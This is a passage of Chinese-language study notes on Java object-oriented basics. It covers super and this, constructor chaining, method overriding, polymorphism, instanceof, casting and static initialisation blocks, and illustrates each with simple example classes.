<code>super.属性或方法</code></p><p>回顾：<code>this.属性或方法</code>调用当前类中的属性或方法</p><p>在方法中可以互相直接调用方法</p></li></ul><p>以下代码实现了 通过子类方法执行类的其他方法，和子类方法中调用父类方法</p><p>Person 父类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome04;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>     <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;Person&quot;</span>;<br>     <span class="hljs-type">int</span> age;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> &#123;<br>         System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>     &#125;<br><br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;Person&quot;</span>);<br><br>    &#125;<br><br><br>    &#125;<br><br></code></pre></td></tr></table></figure><p>Student 子类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome04;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;小明&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Student&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">text1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">/*print();//Student</span><br><span class="hljs-comment">        System.out.println(this.name);</span><br><span class="hljs-comment">        System.out.println(super.name);*/</span><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">text2</span><span class="hljs-params">()</span>&#123;<br>        print();<span class="hljs-comment">//方法中调用方法 </span><br>        <span class="hljs-built_in">this</span>.print();<span class="hljs-comment">//调用这个类的print方法</span><br>        <span class="hljs-built_in">super</span>.print();<span class="hljs-comment">//父类的print方法</span><br>        <br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop;<br><span class="hljs-keyword">import</span> com.oop.dome04.Person;<br><span class="hljs-keyword">import</span> com.oop.dome04.Student;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        s1.text2();<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><p><strong>this   &amp;&amp; super</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">text1</span><span class="hljs-params">(String name)</span>&#123;<br>     print();<span class="hljs-comment">// 此类中的print方法  Student</span><br>     System.out.println(<span class="hljs-built_in">this</span>.name);<span class="hljs-comment">// 就近原则 此类中的name </span><br>     System.out.println(<span class="hljs-built_in">super</span>.name);<span class="hljs-comment">//父类中的属性name</span><br>     System.out.println(name);<span class="hljs-comment">//方法传参的name</span><br><br> &#125;<br></code></pre></td></tr></table></figure><h4 id="有参构造-无参构造"><a href="#有参构造-无参构造" class="headerlink" title="有参构造&amp;&amp; 无参构造"></a><strong>有参构造&amp;&amp; 无参构造</strong></h4><p>以下部分代码 输出： Person无参构造</p><p>​  Student无参构造</p><p><em><strong>new的时候就根据<code>实际类型</code>调用构造器，若是子类构造器，在子类构造器中有隐藏的调用父类构造器的代码 super()</strong></em></p><ul><li><pre><code class="java">Person s1 = new Person();//只调用Person 构造器<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>*x显示调用父类的构造器必须在子类的构造器第一行*<br><br>``` java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Dome01</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> &#123;<br>        Student s1 = <span class="hljs-keyword">new</span> Student();  <span class="hljs-comment">//输出 Person无参构造  Student无参构造</span><br>       <span class="hljs-comment">// s1.text2();</span><br><br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//*******以下为父类**********</span><br><br>package com.oop.dome04;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;<br>   <br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span>()</span> &#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Person无参构造&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//*********以下为子类*************</span><br><br>package com.oop.dome04;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-title">extends</span> <span class="hljs-title">Person</span> &#123;<br>   <br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Student</span>()</span> &#123;<br>        <span class="hljs-comment">//在子类的构造方法中隐藏代码super()  new的时候调用父类的无参构造</span><br>       <span class="hljs-comment">// super();//调用父类的构造器必须在子类的构造器第一行</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Student无参构造&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></code></pre></li><li><p>当子类定义一个有参构造后，无参构造就会消失，就不会默认new的时候调用父类的无参构造了——&gt;只要定义了一个有参构造，就必须显示定义无参构造</p></li></ul><h4 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a><strong>小总结：</strong></h4><ol><li><p>super 注意点：</p><ul><li>super 调用父类的构造方法，必须在构造方法的第一个</li><li><em>super必须只能出现在子类的方法或者构造方法中去调用父类的方法或属性</em></li><li>super() 和this() 不能同时调用构造方法，因为他们都要写在第一行</li></ul></li><li><p>super VS this:<br><em>代表对象不同</em>：this :代表调用者这个对象    super:代表父类对象的应用</p><p><em>前提</em>： this :没有继承也可以使用   super  :  只能在继承条件下才能使用</p><p><em>构造方法</em>：this() 本类的构造       super() 父类的构造</p></li></ol><hr><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>重写都是方法重写，与属性无关</p><p>方法重写只与非静态方法有关，与静态方法无关</p><p>定义的什么类（等号左边的）就调用的什么类的静态方法，回想之前学的方法的调用，静态方法可以直接用类调用（它随类一起加载）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <br>        <span class="hljs-comment">//方法的调用只和左边，定义的数据类型有关</span><br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        a.test();<span class="hljs-comment">//A类中的方法    结果：A----test</span><br>        <br>        <span class="hljs-comment">//父类的引用指向了子类</span><br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        b.test();<span class="hljs-comment">//B类中的方法    结果：B----&gt;test</span><br><span class="hljs-comment">//!!!!它们调用的都是静态方法</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//A类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A---&gt;test()&quot;</span>);<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-comment">//B类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;B---&gt;test()&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然而 非静态方法 与以上的静态方法不同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        a.test();<span class="hljs-comment">//还是A类输出   A----&gt;test</span><br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<span class="hljs-comment">//子类重写了父类的方法 （非静态）</span><br>        b.test();<span class="hljs-comment">//!!!!这里就是调用的A了   输出A---&gt;test</span><br><br><br>    &#125;<br>&#125;<br><br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome05;<br><br><span class="hljs-keyword">import</span> org.w3c.dom.ls.LSOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A---&gt;test()&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><br><br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome05;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;B---&gt;test()&quot;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><strong>理解：</strong></p><p>静态方法属于类，非静态方法属于对象</p><p>静态时方法随类一起加载，new 的b 是B类（等号左边），因此执行B类方法</p><p>非静态时，子类重写了父类的方法，都执行子类方法</p><h4 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h4><p>重写存在于子类父类，有了继承才能在子类中重写父类的方法</p><ol><li><p>子类父类的方法名必须相同，（alt+insert快捷键重写方法自动给就可以实现）</p></li><li><p>参数列表也必须相同（不同那就是<del>方法的重载啦</del>，也不是，方法的重载是在一个类中的）</p></li><li><p>子类重写的方法的修饰符范围只能比父类的修饰符扩大，</p><p>public&gt;protected&gt;default(默认什么都不写的)&gt;private</p></li><li><p>抛出异常：范围，可以缩小，不能扩大</p><p>ClassNotFoundException(小异常)—-&gt;Exception(大异常)</p></li></ol><p><strong>为什么需要重写：</strong></p><ol><li><p>父类的功能子类不需要，或者不一定满足！</p><p>快捷键：alt+insert 选择重写方法</p></li></ol><hr><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//引用类型       实际类型</span><br>Person s1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>Student s2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><ul><li><p>一个对象的实际类型是确定的，但引用类型是不确定的</p></li><li><p>方法重写后，父类的引用类型调用子类的方法（相比继承：子类继承父类的方法和属性），（多态讲的父类何时能调用子类的方法）</p></li><li><p>当方法只有子类中有的时候，父类调用不了子类的，需要强制类型转换（继承时子类自然继承父类的）</p></li><li><p>对象能执行哪些方法看左边引用类型：</p><p>子类的引用类型能调用继承的父类的方法</p><p>而父类的引用类型不能调用子类独有的（要强制类型转换），能调用子类重写后的</p></li><li><p>注意事项：</p><ol><li><p>多态时方法的重写，属性没有多态</p></li><li><p>创建对象时父类和子类有联系，要注意类型转换异常！ ClassCastException!</p></li><li><p>多态存在条件：继承关系，方法重写，<strong>父类引用指向子类对象</strong></p><p><em>不能重写的方法</em></p><ul><li><p>static 方法，不属于实例，属于类,</p></li><li><p>final  修饰的是常量</p></li><li><p>private 方法</p></li></ul></li></ol></li></ul><hr><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><ul><li><p>instanceof是Java中的一种关键字，用于判断一个对象是否属于某个类或其子类</p></li><li><p>在Java中，instanceof关键字通过比较<code>对象的类型</code>和<code>类的类型</code>来判断对象的实例关系。其底层实现原理是通过比较对象的类型和类的类型在内存中的地址。如果两者相同或者具有继承关系，则返回true；否则返回false。</p></li><li></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop;<br><span class="hljs-keyword">import</span> com.oop.dome06.Person;<br><br><span class="hljs-keyword">import</span> com.oop.dome06.Student;<br><span class="hljs-keyword">import</span> com.oop.dome06.Teacher;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//引用类型Student         实际类型Student</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(student <span class="hljs-keyword">instanceof</span> Student);<span class="hljs-comment">//ture</span><br>        System.out.println(student <span class="hljs-keyword">instanceof</span> Object);<span class="hljs-comment">//ture</span><br>        System.out.println(student <span class="hljs-keyword">instanceof</span> Person);<span class="hljs-comment">//ture</span><br>       <span class="hljs-comment">//System.out.println(student instanceof Teacher);//编译报错</span><br>      <span class="hljs-comment">//  System.out.println(student instanceof String); 编译报错</span><br><br><br>        <span class="hljs-comment">//引用类型Object         实际类型Student</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(object <span class="hljs-keyword">instanceof</span> Student);<span class="hljs-comment">//ture</span><br>        System.out.println(object <span class="hljs-keyword">instanceof</span> Object);<span class="hljs-comment">//ture</span><br>        System.out.println(object <span class="hljs-keyword">instanceof</span> Person);<span class="hljs-comment">//ture</span><br>        System.out.println(object <span class="hljs-keyword">instanceof</span> Teacher);<span class="hljs-comment">//false</span><br>        System.out.println(object <span class="hljs-keyword">instanceof</span> String);<span class="hljs-comment">// false</span><br>        System.out.println(<span class="hljs-string">&quot;=====================&quot;</span>);<br><br><br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(person <span class="hljs-keyword">instanceof</span> Student);<span class="hljs-comment">//ture</span><br>        System.out.println(person <span class="hljs-keyword">instanceof</span> Object);<span class="hljs-comment">//ture</span><br>        System.out.println(person <span class="hljs-keyword">instanceof</span> Person);<span class="hljs-comment">//ture</span><br>        System.out.println(person <span class="hljs-keyword">instanceof</span> Teacher);<span class="hljs-comment">//false</span><br>       <span class="hljs-comment">// System.out.println(person instanceof String);// 编译报错</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="小总结：-1"><a href="#小总结：-1" class="headerlink" title="小总结："></a>小总结：</h4><ul><li><p>X  instanceof  Y</p><p>X:对象   Y：类或接口</p><ul><li><p>*<u><strong>编译</strong></u>*：看对象左边的引用类型(如以下例子为:Object)，比较引用类型和Y之间是否存在父子类关系，存在则成功编译。（以上面代码@@@标记处为编译失败的例子）</p></li><li><p>*<u><strong>执行</strong></u>*：看对象右边的实际类型（如以下例子为：Student），比较实际类型和Y之间是否存在父子类关系，存在就输出true 。（以上代码###标记处为输出false的例子）</p><ul><li><p>eg:</p><p>Object s1&#x3D;new Student();&#x3D;&#x3D;父类引用指向子类对象&#x3D;&#x3D;</p><p>System.out.println(s1 instanceof  Student);</p></li></ul></li><li><p>还有一点注意：</p><p>执行比较时：不是比较实际类型嘛，但***必须  实际类型 是Y的子类或就是Y类才输出ture,***实际类型如果是Y的父类则输出false</p><p>(输出false的情况: 实际类型是Y的父类或他们两个不存在父子类关系)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//引用类型Object     实际类型Person</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>System.out.println(object <span class="hljs-keyword">instanceof</span> Student);<span class="hljs-comment">//false  Person是Student的父类输出为false</span><br>System.out.println(object <span class="hljs-keyword">instanceof</span> Object);<span class="hljs-comment">//ture</span><br>System.out.println(object <span class="hljs-keyword">instanceof</span> Person);<span class="hljs-comment">//ture</span><br>System.out.println(object <span class="hljs-keyword">instanceof</span> Teacher);<span class="hljs-comment">//false 同理 Person 是Teacher的父类输出false</span><br>System.out.println(object <span class="hljs-keyword">instanceof</span> String);<span class="hljs-comment">// false 这里就是不存在父子关系输出false</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><hr><h3 id="类型转换-1"><a href="#类型转换-1" class="headerlink" title="类型转换"></a>类型转换</h3><ul><li><p>对象引用类型为父类，不能通过对象调用子类中独有的方法</p><p>如果引用类型为父类，通过对象调用父类子类共有的方法（就是多态啦）</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop;<br><span class="hljs-keyword">import</span> com.oop.dome06.Person;<br><br><span class="hljs-keyword">import</span> com.oop.dome06.Student;<br><span class="hljs-keyword">import</span> com.oop.dome06.Teacher;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//类型之间的转换：父----&gt;子</span><br>        <span class="hljs-comment">//  高&lt;---转-----低</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>       <span class="hljs-comment">//引用类型为父类的对象强制类型转换才能调用子类独有的方法</span><br>        ((Student)s).go();<br>        <span class="hljs-comment">//或</span><br>        Student student=(Student)s;<br>        student.go();<br><br>        <span class="hljs-comment">//自动低转高</span><br>        <span class="hljs-comment">//子类转父类可能丢失自己本来的一些方法（只存在于子类中的方法）</span><br>        Person person=student;<br>        <span class="hljs-comment">//person.go(); 就无法调用</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li><p>强制类型转换  存在条件：<strong>父类引用指向子类对象</strong></p><p>直接 父类引用指向父类对象 创建不能强制类型转换（）</p><p>会报ClassCastException的错误</p></li><li><p>父类转换为子类，向下转型，强制转换</p></li></ol><hr><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><ul><li><p>非静态方法必须new一个对象后才能用对象调用，</p></li><li><p>静态方法跟类一起就加载出来了，可以直接  类.方法  调用</p><p>在同一个类中也可以直接写方法调用，非静态方法中也是可以调用静态方法的</p></li><li><p>new的时候自动调用静态代码块（只执行一次），匿名代码块，构造方法</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome07;<br><br><span class="hljs-keyword">import</span> com.sun.security.jgss.GSSUtil;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <span class="hljs-comment">//2：赋初始值~</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;匿名代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//1: 只执行一次~</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//3：</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造方法&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        System.out.println(<span class="hljs-string">&quot;==========&quot;</span>);<br>        Person p2= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 输出：</span><br><span class="hljs-comment">    * 静态代码块</span><br><span class="hljs-comment">    匿名代码块</span><br><span class="hljs-comment">    构造器</span><br><span class="hljs-comment">    ==========</span><br><span class="hljs-comment">    匿名代码块</span><br><span class="hljs-comment">    构造器*/</span><br>    <br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>发现了一个比较好玩的：</strong></p><p>new的时候调用顺序为静态代码块,匿名代码块，构造方法</p><p>调用构造方法的时候是根据对象的实际类型调用的！</p><ul><li>new Student 